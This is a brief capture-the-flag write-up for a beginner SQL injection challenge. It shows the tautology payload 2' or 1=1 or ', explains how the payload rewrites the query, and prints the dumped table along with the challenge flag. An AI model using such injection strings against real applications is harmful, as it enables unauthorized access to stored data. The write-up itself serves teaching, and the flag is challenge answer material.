# baby_sql
Web

## Challenge 

	Here is an easy SQL injection challenge.

	*Note: DB is SQLite

	http://challs.hats.sg:1350

	Flag format: HATS{.+}

	Challenge by: Gladiator

## Solution


Think of a typical SQL command as this

	SELECT * FROM table WHERE index = '$query';

so if we do this payload,

	2' or 1=1 or '

It becomes this

	SELECT * FROM table WHERE index = '2' or 1=1 or '';

And it selects everything

	--name-- | --description--
	Dog | Is an animal
	Salmon | Is a fish
	flag | HATS{easy_baby_sql_31333333337}
	MOOOO | MEW

## Flag

	HATS{easy_baby_sql_31333333337}
